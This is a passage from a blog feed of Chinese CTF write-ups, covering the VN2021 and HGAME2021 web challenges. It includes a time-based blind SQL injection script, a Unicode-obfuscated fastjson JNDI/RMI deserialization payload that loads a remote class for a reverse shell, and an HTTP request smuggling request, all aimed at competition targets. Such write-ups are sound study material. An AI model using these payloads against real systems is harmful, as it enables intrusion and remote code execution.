punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>孩子实在跑不下去了</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>登录成功</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>js加载图片</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>抓包看</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>结合应该是fastjson反序列化漏洞</p><h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p><p>服务器起 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>再起监听端口</p><p>最后打payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>服务器加载了恶意class文件，成功getshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p><p>继续学习啦</p><p>（想结识更多大佬）</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2021</title>
      <link href="article/hgame2021/"/>
      <url>article/hgame2021/</url>
      
        <content type="html"><![CDATA[<p>HAME2021-week 个人WP</p><p>昵称：Err0r</p><span id="more"></span><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>这是week1，做了Web和部分Misc，后续会整合成一篇文章(先让我水着)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>由于某些原因，以后会注重原理上的研究</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>题目描述： 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 </p><p>题目地址： <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>抓包看看顺风车啥样</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>状态码405Method Not Allowed</p><p>对于任何客户端请求都要进行一套流程，即DNS解析域名返回IP，打开IP套接字(socket)连接IP，再通过套接字写HTTP数据流，最后从WEB服务器接受响应的HTTP数据流。而405状态码就是最后一步生成的，即服务器不响应这种请求方式，请求方式有GET&#x2F;POST&#x2F;HEAD&#x2F;PUT等，换成POST看看。</p><blockquote><p>注意:在burpsuite里面，右键改变请求方式即可</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>随后提示<code>只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>这里只要改UA就行了，User-Agent 简单来说就是告诉服务器访问者是通过什么工具来请求的，添加<code>Infinite Improbability Drive</code>或者直接删掉UA只加这个也可以</p><p>随后提示</p><pre class="language-none"><code class="language-none">你知道吗？&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;茄子&lt;&#x2F;a&gt;特别要求：你得从他的&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;过来</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>这里是要改Referer，简单来说就是告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理，用法一般是为了防外连接，直接用<code>&lt;a href=&quot;&quot;&gt;</code>，<code>用Submit或&lt;input type=&quot;image&quot;&gt;提交的表单(POST或GET)</code>，或者<code>使用JavaScript提交的[表单](https://baike.baidu.com/item/表单)(POST或GET)</code>都是会带上Referer，当然伪造也很简单。</p><p>最后提示<code>flag仅能通过本地访问获得</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>很简单的XFF，XFF就是表示客户端最原始的IP地址，也是很容易伪造</p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>python脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/6 15:57@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>看着直观点</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>题目描述： 简单且上头的游戏 </p><p>题目地址 ： <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>紧跟潮流的小游戏，作者把源码公开了，所以有很多二创。抢了个一血</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>手快2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>看到小游戏题，第一眼看js，github搜一圈了解到这个游戏的源码在.&#x2F;src&#x2F;project.js。但是代码四千行，因为游戏开源，所以很容易能找到分析的源码资料，<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">参考链接</a>，直接搜到控制分数的代码，改掉</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>可以看到这一块3436行<code>default.score</code>是计分块，改成+999999保存，然后把游戏玩结束弹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>题目描述： </p><p><strong>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ </p><p>题目链接： <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: 注意留意服务器信息</strong> </p><p>HTTP请求走私，资料里讲的很详细，建议仔细读一下，这里不做过多阐述</p><p>payload：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>题目描述： 又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） </p><p>题目地址： <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>又到了写脚本环节，首先看下题目</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>我大概是假的大学生</p><p>先找题目，全是ax+b的形式，那就挺好办的，找源码看看怎么取数字</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>应该还是挺好取的，但是开始写脚本发现GET请求不到，应该是对接api的，果然在Sources里面找到了个<code>fuckmath.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token literal-property property">xhrFields</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">withCredentials</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token literal-property property">crossDomain</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">answer</span><span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token literal-property property">xhrFields</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">withCredentials</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">crossDomain</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span 